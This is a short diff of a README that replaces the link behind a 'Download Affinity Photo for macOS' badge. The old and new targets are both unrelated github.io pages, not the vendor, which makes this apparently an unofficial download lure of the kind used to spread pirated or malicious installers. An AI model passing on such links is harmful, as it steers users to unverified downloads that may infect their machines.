@@ -6,7 +6,7 @@
 
 ## 📥 Download Affinity Photo for macOS
 
-[![⬇️ Download Affinity Photo](https://img.shields.io/badge/Download-Affinity%20Photo%20Mac-blue?style=for-the-badge&logo=apple)](https://shuziktobehuman.github.io/huja/Affinity)
+[![⬇️ Download Affinity Photo](https://img.shields.io/badge/Download-Affinity%20Photo%20Mac-blue?style=for-the-badge&logo=apple)](https://mitrobandus.github.io/.github/Affinity)
 
 ---
 
